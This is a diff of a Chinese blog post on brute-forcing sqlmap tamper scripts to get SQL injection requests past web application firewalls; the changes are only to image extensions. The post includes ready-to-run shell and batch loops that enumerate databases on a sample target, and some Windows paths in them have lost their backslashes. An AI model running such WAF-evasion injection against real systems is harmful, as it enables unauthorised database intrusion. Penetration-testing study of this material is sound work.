@@ -84,22 +84,22 @@
 
 
 
-<meta name="description" content="许多情况下我们可以通过使用sqlmap中的tamper脚本来对目标进行更高效的攻击。tamper脚本的作用是修改我们发出的请求来防止其被WAF(网络应用防火墙)拦截。在某些情况你可能需要把一些脚本合并到一起才能过WAF。脚本的完整列表地址在sqlmap    amper。使用方法是加参数–tamper name.py或–tamper name1.py,name2.py,name3.py……但是有那">
+<meta name="description" content="许多情况下我们可以通过使用sqlmap中的tamper脚本来对目标进行更高效的攻击。tamper脚本的作用是修改我们发出的请求来防止其被WAF(网络应用防火墙)拦截。在某些情况你可能需要把一些脚本合并到一起才能过WAF。脚本的完整列表地址在sqlmap    amper。使用方法是加参数–tamper name.py或–tamper name1.py,name2.py,name3.py……">
 <meta property="og:type" content="article">
 <meta property="og:title" content="用sqlmap粗暴地绕过waf">
 <meta property="og:url" content="http://yoursite.com/2018/03/21/用sqlmap粗暴地绕过waf/index.html">
 <meta property="og:site_name" content="Hamal">
-<meta property="og:description" content="许多情况下我们可以通过使用sqlmap中的tamper脚本来对目标进行更高效的攻击。tamper脚本的作用是修改我们发出的请求来防止其被WAF(网络应用防火墙)拦截。在某些情况你可能需要把一些脚本合并到一起才能过WAF。脚本的完整列表地址在sqlmap    amper。使用方法是加参数–tamper name.py或–tamper name1.py,name2.py,name3.py……但是有那">
+<meta property="og:description" content="许多情况下我们可以通过使用sqlmap中的tamper脚本来对目标进行更高效的攻击。tamper脚本的作用是修改我们发出的请求来防止其被WAF(网络应用防火墙)拦截。在某些情况你可能需要把一些脚本合并到一起才能过WAF。脚本的完整列表地址在sqlmap    amper。使用方法是加参数–tamper name.py或–tamper name1.py,name2.py,name3.py……">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/images/4.1.png">
-<meta property="og:image" content="http://yoursite.com/images/4.2.png">
-<meta property="og:image" content="http://yoursite.com/images/4.3.png">
-<meta property="og:image" content="http://yoursite.com/images/4.4.png">
-<meta property="og:updated_time" content="2018-03-21T05:09:58.142Z">
+<meta property="og:image" content="http://yoursite.com/images/4.1.jpg">
+<meta property="og:image" content="http://yoursite.com/images/4.2.jpg">
+<meta property="og:image" content="http://yoursite.com/images/4.3.jpg">
+<meta property="og:image" content="http://yoursite.com/images/4.4.jpg">
+<meta property="og:updated_time" content="2018-03-21T05:13:57.832Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="用sqlmap粗暴地绕过waf">
-<meta name="twitter:description" content="许多情况下我们可以通过使用sqlmap中的tamper脚本来对目标进行更高效的攻击。tamper脚本的作用是修改我们发出的请求来防止其被WAF(网络应用防火墙)拦截。在某些情况你可能需要把一些脚本合并到一起才能过WAF。脚本的完整列表地址在sqlmap    amper。使用方法是加参数–tamper name.py或–tamper name1.py,name2.py,name3.py……但是有那">
-<meta name="twitter:image" content="http://yoursite.com/images/4.1.png">
+<meta name="twitter:description" content="许多情况下我们可以通过使用sqlmap中的tamper脚本来对目标进行更高效的攻击。tamper脚本的作用是修改我们发出的请求来防止其被WAF(网络应用防火墙)拦截。在某些情况你可能需要把一些脚本合并到一起才能过WAF。脚本的完整列表地址在sqlmap    amper。使用方法是加参数–tamper name.py或–tamper name1.py,name2.py,name3.py……">
+<meta name="twitter:image" content="http://yoursite.com/images/4.1.jpg">
 
 
 
@@ -363,9 +363,9 @@
       
 
       
-        <p>许多情况下我们可以通过使用sqlmap中的tamper脚本来对目标进行更高效的攻击。tamper脚本的作用是修改我们发出的请求来防止其被WAF(网络应用防火墙)拦截。在某些情况你可能需要把一些脚本合并到一起才能过WAF。脚本的完整列表地址在sqlmap    amper。使用方法是加参数–tamper name.py或–tamper name1.py,name2.py,name3.py……<br><img src="/images/4.1.png" alt="" title="linux下tamper脚本位置"><br><img src="/images/4.2.png" alt="" title="win下tamper脚本位置"><br>但是有那么多tamper该如何快速找出适合的？一个一个来试是否是太累太费劲，而且对有些小白来讲很难记住每个tamper脚本具体是做什么用的。土司的lostwolf写了一个sh命令，可以在kali下直接依次使用每个tamper脚本，从而找到合适的。该sh语句是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for t in `ls /usr/share/sqlmap/tamper/*.py`; do echo -e &quot;e[41;1m tamper: $te[0m&quot;; sqlmap -u &quot;http://192.168.1.100/sql.asp?id=1&quot; --dbs --random-agent --smart --batch --tamper $t --threads 10;done;</span><br></pre></td></tr></table></figure></p>
-<p><img src="/images/4.3.png" alt=""><br>说明下 –random-agent参数随机；random-agent 随机agent头 ；–smart 智能机的方式；–batch 默认选择接收输入；echo -e “e[41;1m tamper: $te[0m”; 是为了红底白字显示当前使用的tamper脚本。<br>如果在windows下怎么办，我写了一个批处理，命令如下（sqlmap路径位置自行更改）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /f &quot;delims=&quot; %%i in (&apos;dir /b D:sqlmap	amper*.py&apos;) do d:sqlmapsqlmap.py -u &quot;http://192.168.1.100/sql.asp?id=1&quot; --dbs --random-agent --smart --batch --tamper %%i --threads 10</span><br></pre></td></tr></table></figure></p>
-<p><img src="/images/4.4.png" alt=""><br>当然这个方法也是有缺陷的，会非常粗暴地调用每个tamper脚本来试一次，并且不会组合脚本来测试了，所以大家如果能了解每个tamper脚本作用，精准的调用，会省力省时很多。<br>原文地址:<a href="https://www.toutiao.com/i6527560237581337091/" target="_blank" rel="noopener">https://www.toutiao.com/i6527560237581337091/</a></p>
+        <p>许多情况下我们可以通过使用sqlmap中的tamper脚本来对目标进行更高效的攻击。tamper脚本的作用是修改我们发出的请求来防止其被WAF(网络应用防火墙)拦截。在某些情况你可能需要把一些脚本合并到一起才能过WAF。脚本的完整列表地址在sqlmap    amper。使用方法是加参数–tamper name.py或–tamper name1.py,name2.py,name3.py……<br><a id="more"></a><br><img src="/images/4.1.jpg" alt="" title="linux下tamper脚本位置"><br><img src="/images/4.2.jpg" alt="" title="win下tamper脚本位置"><br>但是有那么多tamper该如何快速找出适合的？一个一个来试是否是太累太费劲，而且对有些小白来讲很难记住每个tamper脚本具体是做什么用的。土司的lostwolf写了一个sh命令，可以在kali下直接依次使用每个tamper脚本，从而找到合适的。该sh语句是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for t in `ls /usr/share/sqlmap/tamper/*.py`; do echo -e &quot;e[41;1m tamper: $te[0m&quot;; sqlmap -u &quot;http://192.168.1.100/sql.asp?id=1&quot; --dbs --random-agent --smart --batch --tamper $t --threads 10;done;</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/4.3.jpg" alt=""><br>说明下 –random-agent参数随机；random-agent 随机agent头 ；–smart 智能机的方式；–batch 默认选择接收输入；echo -e “e[41;1m tamper: $te[0m”; 是为了红底白字显示当前使用的tamper脚本。<br>如果在windows下怎么办，我写了一个批处理，命令如下（sqlmap路径位置自行更改）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /f &quot;delims=&quot; %%i in (&apos;dir /b D:sqlmap	amper*.py&apos;) do d:sqlmapsqlmap.py -u &quot;http://192.168.1.100/sql.asp?id=1&quot; --dbs --random-agent --smart --batch --tamper %%i --threads 10</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/4.4.jpg" alt=""><br>当然这个方法也是有缺陷的，会非常粗暴地调用每个tamper脚本来试一次，并且不会组合脚本来测试了，所以大家如果能了解每个tamper脚本作用，精准的调用，会省力省时很多。<br>原文地址:<a href="https://www.toutiao.com/i6527560237581337091/" target="_blank" rel="noopener">https://www.toutiao.com/i6527560237581337091/</a></p>
 
       
     </div>
